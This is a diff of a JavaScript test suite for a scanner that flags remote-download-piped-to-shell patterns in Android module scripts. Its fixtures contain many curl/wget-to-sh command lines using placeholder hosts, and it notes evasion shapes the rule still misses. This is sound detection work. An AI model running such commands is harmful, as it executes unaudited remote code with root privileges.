@@ -4347,18 +4347,37 @@ test('T3.2-C3 反向：`if [ -f "$MODPATH/x" ]` 这类测试位不算执行（�
   assert.deepEqual(t31mod(t), [], '同理另一条规则也不报');
 });
 
-test('T3.2-D1 形状：命令位只有一份实现 —— 控制词表只住在共享层那一处', () => {
+test('T3.2-D1 形状：控制词表只有一张 —— T3.3 起它被两处读（命令位 + 共享层左边界）', () => {
   // 本轮的存在理由：`logicalFirstToken` 是命令位的唯一口径。DOWNLOAD_THEN_EXEC /
   // DOWNLOAD_TO_MODULE_EXEC 里不许出现「跳过 if」那种局部逻辑，否则就是 fix6-F1 的病复发。
+  //
+  // T3.3 的放宽（工单 §2）：**读点**从 1 处改成 2 处 —— 第二处是 PIPE_TO_SHELL 的左边界，
+  // 它必须读同一张表、不许抄一份。表本身仍然只许有一张（下面两条新增断言钉着）。
   const src = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
   const decl = /const SHELL_CONTROL_WORDS = new Set\(\[([^\]]*)\]\)/.exec(src);
   assert.ok(decl, '共享层必须有一张具名的控制词表（只改函数体不写表 = 判据没落地，也没有第二处可查）');
   const words = decl[1].split(',').map((s) => s.trim().replace(/^'|'$/g, '')).filter(Boolean).sort();
-  assert.deepEqual(words, ['!', '{', '}', 'case', 'do', 'done', 'else', 'fi', 'for', 'if', 'select', 'then', 'time', 'until', 'while'].sort(),
-    '表的内容必须逐字等于工单 §1 给的那一张：一格不多（`[`/`test`/`&&`/`exec` 没收），一格不少');
-  assert.equal((src.match(/SHELL_CONTROL_WORDS\.has\(/g) || []).length, 1,
-    '这张表只许被一个地方读：逻辑行命令位那一个函数');
+  // 工单 §1 那 15 个 + T3.3 §2 补的 `elif`（POSIX 保留字，`elif curl … | sh` 与 if 那一族同一个写法）。
+  // **补 elif 必须与这张逐字清单同时改** —— 少改任何一边都当场红（工单 §2 说这是设计好的，不许绕）。
+  assert.deepEqual(words, ['!', '{', '}', 'case', 'do', 'done', 'elif', 'else', 'fi', 'for', 'if', 'select', 'then', 'time', 'until', 'while'].sort(),
+    '表的内容必须逐字等于工单 §1 给的那一张 + T3.3 补的 elif：一格不多（`[`/`test`/`&&`/`exec`/`esac`/`in` 没收），一格不少');
+  // 读点恰好两处：命令位用 `.has(` 逐词判；左边界要把整张表展开成正则分支（`.has(` 在正则构造里拿不到词表，
+  // 所以第二处读的是集合本身 —— 工单 §2 把这一处写成「`.has(` 从 1 改 2」，这里按实现的两类读法分开钉，
+  // 合计仍然是 2 处，且比原文更强：既拦「又加一处读」，也拦「把词表抄进 pattern」。
+  const hasReads = (src.match(/SHELL_CONTROL_WORDS\.has\(/g) || []).length;
+  const spreadReads = (src.match(/\[\.\.\.SHELL_CONTROL_WORDS\]|\bfrom\(SHELL_CONTROL_WORDS\)/g) || []).length;
+  assert.equal(hasReads, 1, '命令位那一处读必须还是 `.has(`（逻辑行那一个函数）');
+  assert.equal(spreadReads, 1, '左边界那一处读必须是**展开整张表**，不是把词表抄进 pattern');
+  assert.equal(hasReads + spreadReads, 2, '工单 §2：读点从 1 处改成 2 处 —— 第三处读就是又一个口径');
   assert.equal((src.match(/const SHELL_CONTROL_WORDS = new Set\(/g) || []).length, 1, '这张表只许声明一次');
+  // 新增断言①（工单 §2）：源码里不许出现**第二张具名控制词表**。
+  // 判据按「那张 Set 的字面量里含 ≥2 个控制词」算，所以 DTE_TOOLS / DTE_EXEC_VERBS / ARG_ONLY_VERB
+  // 这些同层表不会被误算（它们一格控制词都没有）。
+  const tablesWithControlWords = [...src.matchAll(/const\s+([A-Za-z0-9_]+)\s*=\s*new Set\(\[([\s\S]*?)\]\)/g)]
+    .filter((m) => m[2].split(',').map((s) => s.trim().replace(/^'|'$/g, '')).filter((t) => words.includes(t)).length >= 2)
+    .map((m) => m[1]);
+  assert.deepEqual(tablesWithControlWords, ['SHELL_CONTROL_WORDS'],
+    `含控制词的具名 Set 只许有一张，实际：${JSON.stringify(tablesWithControlWords)} —— 两张各自演化就是 fix6-F1 的病`);
 });
 
 test('T3.2-D2 让位与顺序判据一字未动：执行行必须晚于落地行，路径仍要求精确相等', () => {
@@ -4376,13 +4395,14 @@ test('T3.2-D2 让位与顺序判据一字未动：执行行必须晚于落地行
     'if /data/local/tmp/u -h; then')), [], '-qO- 是标准输出：命令位穿透不许把它变成落盘');
   // 让位口径没变：管道那一行仍然只归 PIPE_TO_SHELL，本规则不抢
   assert.deepEqual(t31dte(t31body(T31_SHEBANG, 'if curl -s https://x.dev/a | sh')), []);
-  // 观察（不是本轮授权面内的改动，改前改后同一个值，写在这儿是为了不让它被当成「已经接住」）：
-  // PIPE_TO_SHELL 的 pattern 要求下载器紧跟在 `^` 或 `[|;&`(]` 之后 ⇒ `if curl … | sh` 这种**控制词前缀**
-  // 的管道今天也是 0 命中。它与本轮修掉的那一格是同一个病，但那张 pattern 本轮一个字没动。
-  assert.deepEqual(hits('PIPE_TO_SHELL', t31body(T31_SHEBANG, 'if curl -s https://x.dev/a | sh')).map((f) => f.line), [],
-    '本轮没动 PIPE_TO_SHELL：控制词前缀的管道形态仍是它自己的限度（已交回主控）');
+  // 观察（T3.2 那一轮记下的限度，**T3.3 已经闭上它**）：PIPE_TO_SHELL 的左边界原来只认 `^` 与 `[|;&`(]`，
+  // 于是 `if curl … | sh` 这种**控制词前缀**的管道在 main 上是 low/auto-approve（task-3.2-report.md §4 那张表）。
+  // 本轮把左边界扩成「行首 | 语句边界符后 | 控制词 + 空白后」，这一格从 0 命中变成命中 —— 下面两条是它的回归哨兵，
+  // 正面逐形夹具见 T3.3-A1/A2。
+  assert.deepEqual(hits('PIPE_TO_SHELL', t31body(T31_SHEBANG, 'if curl -s https://x.dev/a | sh')).map((f) => f.line), [2],
+    'T3.3 闭上的是这一格：改前的实际值是 []（工单 §0 复现表第 2 行）');
   assert.deepEqual(hits('PIPE_TO_SHELL', t31body(T31_SHEBANG, 'curl -s https://x.dev/a | sh')).map((f) => f.line), [2],
-    '没有控制词前缀时它照旧命中：上面那个 0 不是本轮改出来的');
+    '没有控制词前缀时它照旧命中：上面那一格不是把既有口径改松了才「多出来」的');
 });
 
 test('T3.2-D3 继续不修的两格：$DOWNLOADER 与 bounded "$BB" wget，前缀换成控制词之后仍然不立 sink', () => {
@@ -4394,5 +4414,213 @@ test('T3.2-D3 继续不修的两格：$DOWNLOADER 与 bounded "$BB" wget，前�
   assert.deepEqual(t31dte(t31body(T31_SHEBANG,
     '    if [ -n "$BB" ] && bounded 90 "$BB" wget -q -T 20 -O /data/local/tmp/kb.bin "$3" 2>/dev/null; then',
     'sh /data/local/tmp/kb.bin')), [], '命令位是 bounded ⇒ 整段词全是参数；本轮没把它做掉');
+});
+
+// ===========================================================================
+// Task 3.3 —— PIPE_TO_SHELL 的左边界收 shell 控制词（生产上今天就在的那一格）
+// ===========================================================================
+// 需求来源：工单 `briefs/task-3.3.md` §2/§3；背景 = 计划 §0.19 + task-3.2-report.md §4 +
+// task-3.1-report.md §9。那张七行复现表是在 **main 那份 shipped 代码**上跑的；本会话在 455ca04 上
+// 用 `p5-t33-run/probe-before.mjs` 逐形重跑，改前实际值与它一致（正面每一形 PIPE_TO_SHELL=0、
+// 整包 low/auto-approve，只有 `true && …` 那一形是 high/block）。
+//
+// **本轮的性质要说准（工单 §0，报告里同一节）**：这是「洞今天开着、但样本里没人用它」。
+// 13 真包 + 5 老包的解包树里「控制词前缀的管道写法」实测 **0 处**（全程静态读，没执行任何包内脚本）
+// ⇒ 本轮预期翻转的包数 = 0，不会有正经包因为这一改进人工队列。
+// 它是「在别人用上之前把门闭上」，不是「抓到现在的某个包」—— 不许写成拦截战果。
+//
+// 夹具形状一律用工单/计划给的**逐字形状**（`if curl -s https://x.dev/a | sh` 那一族），不换合成写法。
+// 断言口径沿用 T3：每条都 deepEqual 到精确 findings 多重集合，不写 some(...)。
+const T33_SHE = '#!/system/bin/sh';
+const t33body = (...lines) => lines.join('\n') + '\n';
+const t33pipe = (text) => hits('PIPE_TO_SHELL', text, 'service.sh').map((f) => `${f.line}/${f.severity}`).sort();
+const t33dte = (text) => hits('DOWNLOAD_THEN_EXEC', text, 'service.sh').map((f) => `${f.line}/${f.severity}`).sort();
+/** 工单 §3：正面每一形都要「文本层 1 命中 PIPE_TO_SHELL/high」**且**「整包 high/block」—— 两个层次各自钉死。 */
+const T33_POSITIVE = [
+  // [形状名, service.sh 的那些行（第一行是 shebang）, 管道那一行的精确落点]
+  ['if', ['if curl -s https://x.dev/a | sh'], '2/high'],
+  ['while', ['while curl -s https://x.dev/a | sh; do', '  break', 'done'], '2/high'],
+  ['until', ['until curl -s https://x.dev/a | sh; do', '  break', 'done'], '2/high'],
+  ['for', ['for curl -s https://x.dev/a | sh'], '2/high'],
+  ['time', ['time curl -s https://x.dev/a | sh'], '2/high'],
+  ['!', ['! curl -s https://x.dev/a | sh'], '2/high'],
+  ['else', ['if :; then', '  :', 'else curl -s https://x.dev/a | sh'], '4/high'],
+  ['then', ['if :; then curl -s https://x.dev/a | sh', 'fi'], '2/high'],
+  ['组合 if !', ['if ! curl -s https://x.dev/a | sh; then', '  ui_print "- fail"', 'fi'], '2/high'],
+  ['if wget -qO-', ['if wget -qO- https://x.dev/a | sh; then', '  :', 'fi'], '2/high'],
+  ['缩进 if（真包形状）', ['    if curl -s https://x.dev/a | sh; then', '      ui_print "- ok"', '    fi'], '2/high'],
+];
+
+test('T3.3-A1 正面（工单 §3 那十形）：控制词前缀的管道必须 1 命中 PIPE_TO_SHELL/high，整包 high/block', async () => {
+  let i = 0;
+  for (const [label, lines, want] of T33_POSITIVE) {
+    const t = t33body(T33_SHE, ...lines);
+    assert.deepEqual(t33pipe(t), [want],
+      `${label}：管道那一行必须恰好 1 条 PIPE_TO_SHELL/high（把控制词从新左边界里摘掉 = 变异 M1，红在这一格）`);
+    const r = await t3scan(`eval.t33a${i++}`, t);
+    assert.deepEqual(t3spots(r, 'PIPE_TO_SHELL'), [`service.sh:${want}`], `${label}：报告里的落点与文本层一致`);
+    assert.deepEqual(t3set(r), ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high'], `${label}：整包 findings 多重集合`);
+    assert.equal(r.riskLevel, 'high', `${label}：整包等级`);
+    assert.equal(r.decision.action, 'block', `${label}：这一形改前是 low/auto-approve —— 闭的就是走机器人自动合并那一格`);
+  }
+});
+
+test('T3.3-A2 正面（本轮新增的那一格）：elif 前缀的管道必须命中，且命令位也同步穿透（表只有一张）', async () => {
+  // `elif curl … | sh` 是 if/while 那一族的自然写法，POSIX 保留字。工单 §2：补它必须**同时**改
+  // T3.2-D1 那张逐字清单 —— 把 elif 从表里摘掉（变异 M2）时，这里和 D1 两条一起红。
+  const t = t33body(T33_SHE, 'if :; then', '  :', 'elif curl -s https://x.dev/a | sh; then', '  :', 'fi');
+  assert.deepEqual(t33pipe(t), ['4/high'], 'elif 那一行必须命中（摘掉 elif 时这一格必红 = 变异 M2）');
+  const r = await t3scan('eval.t33b', t);
+  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block', 'elif 不许成为新的自动放行入口');
+  // 同一张表服务两处：elif 进了表 ⇒ 命令位那边也穿透它（左边界读的是表，不是抄本）
+  assert.equal(t32cmd(t, 4), 'curl', 'elif 之后那个词才是这条逻辑行的命令');
+});
+
+// —— §3 反面：一条都不许多，且整包结论不许变松 ——
+
+test('T3.3-B1 反面·对照（工单 §3 反 1）：`true && curl … | sh` 既有口径本来就命中，本轮没改它', async () => {
+  const t = t33body(T33_SHE, 'true && curl -s https://x.dev/a | sh');
+  assert.deepEqual(t33pipe(t), ['2/high'], '`&&` 那一支走的是语句边界符，与本轮新增的控制词一支无关');
+  const r = await t3scan('eval.t33c', t);
+  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
+  assert.equal(r.decision.action, 'block', '改前改后同一个结论（工单 §0 复现表最后一行）');
+});
+
+test('T3.3-B2 反面（工单 §3 反 2）：引号里/注释里的散文不许被当成管道行', () => {
+  // 新左边界要求控制词**整词**站在语句起点上（行首或语句边界符之后）且后面真的跟着空白：
+  //   * `ui_print "if curl x | sh …"` —— `if` 前面是引号，不是边界符 ⇒ 0；
+  //   * `# 说明：if curl … | sh …` —— 行首是 `#`，`^\s*` 之后那个词不是控制词 ⇒ 0；
+  //   * `ui_print "- 提示：case curl … | sh …"` —— 同理，而且 `|` 后面那个词是 `sh` 不是下载器 ⇒ 0。
+  // 「任意单词后都算」的过宽版左边界（变异 M3）红在这三条上。
+  assert.deepEqual(t33pipe(t33body(T33_SHE, 'ui_print "if curl x | sh 是禁止的写法"')), [],
+    '引号里的散文：0 命中（工单给的逐字形状）');
+  assert.deepEqual(t33pipe(t33body(T33_SHE, '# 说明：if curl -s https://x.dev/a | sh 这种写法禁止')), [],
+    '整行注释里的散文：0 命中');
+  assert.deepEqual(t33pipe(t33body(T33_SHE, 'ui_print "- 提示：case curl -s https://x.dev/a | sh 在别处是禁止的"')), [],
+    '引号里的第二形：控制词在引号里也一样不许被当成命令位');
+  // 对照（工单 §3 反 2 括号里那句「`exclude: /^\s*#/` 那一支行为不变」）：那条行级注释豁免住在别的规则里，
+  // 本轮一个字没动 —— 注释豁免是那些规则自己的口径，PIPE_TO_SHELL 不靠它（也不许顺手加一个）。
+  const comment = t33body(T33_SHE, '# unzip -q -d $MODPATH /sdcard/p.zip');
+  const notComment = t33body(T33_SHE, 'unzip -q -d $MODPATH /sdcard/p.zip');
+  assert.equal(hits('MODDIR_RUNTIME_WRITE', comment, 'service.sh').length, 0, '既有注释豁免：0 命中，行为不变');
+  assert.equal(hits('MODDIR_RUNTIME_WRITE', notComment, 'service.sh').length, 1, '同一行去掉注释符照旧命中：豁免还是那条豁免');
+});
+
+test('T3.3-B3 反面（工单 §3 反 3）：只有落盘没有管道 ⇒ PIPE_TO_SHELL 0，由 DOWNLOAD_THEN_EXEC 那一族说话', () => {
+  // 工单 §2 明令本轮不许把两族并起来：左边界加宽只加在**管道**那一支的左边。
+  const plain = t33body(T33_SHE,
+    'curl -s https://x.dev/a -o /data/local/tmp/u',
+    'chmod 700 /data/local/tmp/u',
+    '/data/local/tmp/u');
+  assert.deepEqual(t33pipe(plain), [], '没有管道 ⇒ PIPE_TO_SHELL 必须 0');
+  assert.deepEqual(t33dte(plain), ['4/high'], '落盘那一族的口径一字未动');
+  const prefixed = t33body(T33_SHE,
+    'if curl -s https://x.dev/a -o /data/local/tmp/u',
+    'chmod 700 /data/local/tmp/u',
+    '/data/local/tmp/u');
+  assert.deepEqual(t33pipe(prefixed), [], '控制词前缀 + 落盘（没有管道）：左边界加宽不许把它读成直连执行');
+  // 顺带钉住一个**既有**事实（本轮没动它）：DOWNLOAD_THEN_EXEC 的 sink 侧要求段首那个词就是下载器
+  //（`dteCollectSinks` 读的是 `seg[0]`，不是逻辑行的命令位）⇒ `if curl … -o 路径` 这一格今天就不立 sink，
+  // 与 task-3.1-report.md §9.1、T3.2-D3 钉的是同一格。所以这里两个族都是 0 —— 不是「换一族来说话」。
+  assert.deepEqual(t33dte(prefixed), [], 'sink 侧的段首口径一字未动：if 前缀那一格仍然不立 sink（既有限度）');
+});
+
+test('T3.3-B4 反面（工单 §3 反 4）：case 打头那一行与 curl)/wget) 标签都不是命令位 ⇒ 0 命中', () => {
+  // 形状取自真包 AlwaysStrong keybox_fetch.sh:83-88 的 run_engine（`case "$1" in` + `curl)`/`wget)` 标签，
+  // 逐字见 T3.1-C1）。标签**右边那半句**是夹具补的管道写法 —— 真包那两行的落盘目标是位置参数 `$3`
+  //（task-3.1-report.md §8.4），补它是为了把「左边界」这一半单独拎出来观察。
+  // 与 task-3.1 §9 那条 case 标签夹具不重复：那条钉的是「标签不立 sink」（DOWNLOAD_THEN_EXEC），
+  // 这条钉的是「标签不是 PIPE_TO_SHELL 的左边界」。
+  const block = t33body(T33_SHE,
+    '    case "$TOOL" in',
+    '        curl)    busybox wget -qO- https://x.dev/a | sh ;;',
+    '        wget)    busybox wget -qO- https://x.dev/b | sh ;;',
+    '    esac');
+  assert.deepEqual(t33pipe(block), [],
+    '`case` 打头那一行本身不该命中；`curl)`/`wget)` 是标签，标签不是命令（过宽版 = 变异 M3 红在这儿）');
+  assert.deepEqual(t33dte(block), [], '两族都不报：标签行既不立 sink（T3.1-C1 已钉），也不是管道左边界');
+  const oneLine = t33body(T33_SHE, '    case "$TOOL" in curl) busybox wget -qO- https://x.dev/a | sh ;; esac');
+  assert.deepEqual(t33pipe(oneLine), [], '同一族的一行式写法：`in` 不在表里，`curl)` 也不是控制词 ⇒ 仍然 0');
+  // 活体检测：`case` 确实在表里（它打头 + 紧跟下载器时左边界是认的），上面那两个 0 不是因为整条支路失效
+  assert.deepEqual(t33pipe(t33body(T33_SHE, 'case curl -s https://x.dev/a | sh')), ['2/high'],
+    '`case` 站在语句起点上时它就是一个控制词 —— 标签那一格与它是两件事');
+  // 反面对照：同一载荷把下载器放到**真**语句边界符之后 ⇒ 规则看得见它
+  assert.deepEqual(t33pipe(t33body(T33_SHE, '    case "$TOOL" in curl) esac; busybox wget -qO- https://x.dev/a | sh')), ['2/high'],
+    '边界符那一支照旧：上面 0 是判据在筛，不是规则没看见');
+});
+
+// —— §3 不变量：只动左边界，其余一字不动 ——
+
+test('T3.3-C1 不变量：severity/category/title/advice 与管道右半、`<(` 那一支一字未动', () => {
+  const r = RULES_BY_ID.PIPE_TO_SHELL;
+  assert.equal(r.severity, 'high', '工单 §2：severity 不动');
+  assert.equal(r.category, 'dangerous', '工单 §2：category 不动');
+  assert.equal(r.anchor, 'anywhere', '锚点声明不动（闭包表继续按「x=1; 」前缀验它）');
+  assert.equal(r.title, '下载内容直连 shell 执行（curl|sh / wget|sh）', '文案不动：本轮没换主张，只换左边界');
+  assert.equal(r.advice, '禁止。远程内容可在 root 下任意执行且无法审计，必须先落盘、校验校验和，再执行。', 'advice 不动');
+  const src = r.pattern.source;
+  // 右半逐段对账（改前的 pattern.source 里就是这些字节，本轮只在**左边**加）
+  assert.ok(src.includes('\\b[^\\n|]*\\|[^\\n]*\\b(?:sh|bash|ash|ksh|zsh|python3?|perl|su)\\b'),
+    `sink 词表那半边被改到了：${src}`);
+  assert.ok(src.includes('(?:curl|wget|busybox\\s+wget|busybox\\s+curl)'), `下载器写法面被改到了：${src}`);
+  assert.ok(src.includes('\\b(?:sh|bash|ash)\\s*<\\(\\s*(?:curl|wget)\\b'), `第二支 <( 被改到了：${src}`);
+  assert.ok(src.startsWith('(?:^|[|;&`(]\\s*|'), `第一支（改前的整个左边界）必须还在：${src}`);
+  // 行为层对账：改前改后同一个值的几形
+  assert.deepEqual(t33pipe(t33body(T33_SHE, 'sh <(curl -s https://x.dev/a)')), ['2/high'], '第二支 `<(` 那一支照旧');
+  assert.deepEqual(t33pipe(t33body(T33_SHE, 'curl http://a.b | busybox sh')), ['2/high'], 'sink 词表那一半照旧');
+  assert.deepEqual(t33pipe(t33body(T33_SHE, 'wget -O- http://1.2.3.4/x | bash')), ['2/high'], '标准输出形态照旧');
+});
+
+test('T3.3-C2 不变量：纯函数、maxPerFile、一行一条的基数都没被新左边界带着动', () => {
+  const one = t33body(T33_SHE, 'if curl -s https://x.dev/a | sh');
+  assert.equal(JSON.stringify(RULES_BY_ID.PIPE_TO_SHELL.scan('service.sh', one)),
+    JSON.stringify(RULES_BY_ID.PIPE_TO_SHELL.scan('service.sh', one)),
+    '两次同输入必须同结果（左边界是新写的，纯函数是既有契约）');
+  // maxPerFile=20：30 行同形状 ⇒ 仍然按**行**收敛到 20，一条都不许多
+  const many = t33body(T33_SHE, ...Array.from({ length: 30 }, (_, k) => `if curl -s https://x.dev/a${k} | sh`));
+  assert.equal(hits('PIPE_TO_SHELL', many, 'service.sh').length, 20, 'maxPerFile 没动');
+  // fix3-P7 契约 1：一行两处管道 ⇒ 基数仍然「一行最多一条」
+  assert.equal(hits('PIPE_TO_SHELL', t33body(T33_SHE,
+    'if curl -s https://x.dev/a | sh; wget -qO- https://x.dev/b | bash'), 'service.sh').length, 1,
+    '新左边界不许把一行拆成两条发现');
+  // counts 去重键（ruleId@file:line）与 severity 口径不变
+  assert.deepEqual(T33_POSITIVE.slice(0, 2).map(([, lines, want]) => want), ['2/high', '2/high'],
+    '夹具自身的口径核对：正面两形都落在第 2 行');
+});
+
+test('T3.3-D1 形状：左边界读的就是那张具名表 —— pattern 里不许手写控制词字面量', () => {
+  // 工单 §2 新增的那半条不变量：允许被共享层左边界读，但**不许在 pattern 里手写控制词**。
+  // 判据（runtime，比读源码字符串更强）：每一个控制词在 PIPE_TO_SHELL 的 pattern.source 里
+  // 只能作为「表展开出来的那一段」出现一次；谁手写一份第二张表进 pattern，这里当场数出两次。
+  const src = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
+  const words = /const SHELL_CONTROL_WORDS = new Set\(\[([^\]]*)\]\)/.exec(src)[1]
+    .split(',').map((s) => s.trim().replace(/^'|'$/g, '')).filter(Boolean);
+  assert.ok(words.includes('elif'), 'elif 必须在表里（工单 §2）');
+  const pattern = RULES_BY_ID.PIPE_TO_SHELL.pattern.source;
+  for (const w of words.filter((x) => /^[a-z]+$/.test(x))) {
+    const n = (pattern.match(new RegExp(`(?:^|[^a-z])${w}(?:[^a-z]|$)`, 'g')) || []).length;
+    assert.equal(n, 1, `控制词 ${w} 在 pattern 里只许出现一次（来自那张表的展开）：出现 ${n} 次 = 有人手抄了一份`);
+  }
+  // 新左边界里那个「控制词序列」必须是**可重复**的（组合形 `if ! curl … | sh` 靠它），且不许有别的词表来源
+  const leftPart = pattern.slice(0, pattern.indexOf('(?:curl|wget'));
+  assert.ok(leftPart.includes(')+'), '控制词那一支必须是重复形：组合形 if ! curl … | sh 靠它');
+});
+
+test('T3.3-D2 观察（本轮不修，交回主控）：缩进的裸 `curl … | sh` 仍然 0 —— 左边界只往控制词那一格加宽', () => {
+  // 跑实验量出来的另一格：`^` 那一支后面没有 `\s*`，所以**行首带缩进**的裸管道今天也不命中。
+  // 它与控制词无关，收它会直接改变真包里缩进写法的命中面（工单 §4.4 期望 −0/+0），本轮不动它，
+  // 只把它钉成观察 —— 免得下一轮把它读成「已经接住」。
+  assert.deepEqual(t33pipe(t33body(T33_SHE, '    curl -s https://x.dev/a | sh')), [],
+    '缩进 + 裸管道：改前 0，本轮之后仍然 0（不在工单 §2 的授权面里）');
+  assert.deepEqual(t33pipe(t33body(T33_SHE, 'curl -s https://x.dev/a | sh')), ['2/high'],
+    '同一形状不带缩进照旧命中：上面那个 0 不是本轮改出来的');
+  // 同一族的另一格（工单 §2 明令 `sh -c <(curl …)` 那一支不动）：第二支要求解释器**紧跟** `<(`，
+  // 所以 `sh -c <(curl …)` 今天不命中。改前改后同一个值，钉在这儿免得下一轮把它读成「已经接住」。
+  assert.deepEqual(t33pipe(t33body(T33_SHE, 'sh -c <(curl -s https://x.dev/a)')), [],
+    '`<(` 那一支的中间多一个 `-c` 就不命中 —— 本轮没动那一支，这是既有限度不是新洞');
+  assert.deepEqual(t33pipe(t33body(T33_SHE, 'sh <(curl -s https://x.dev/a)')), ['2/high'],
+    '去掉 `-c` 那一格照旧命中：上面那个 0 是那一支自己的形状，不是规则整体失效');
 });
 
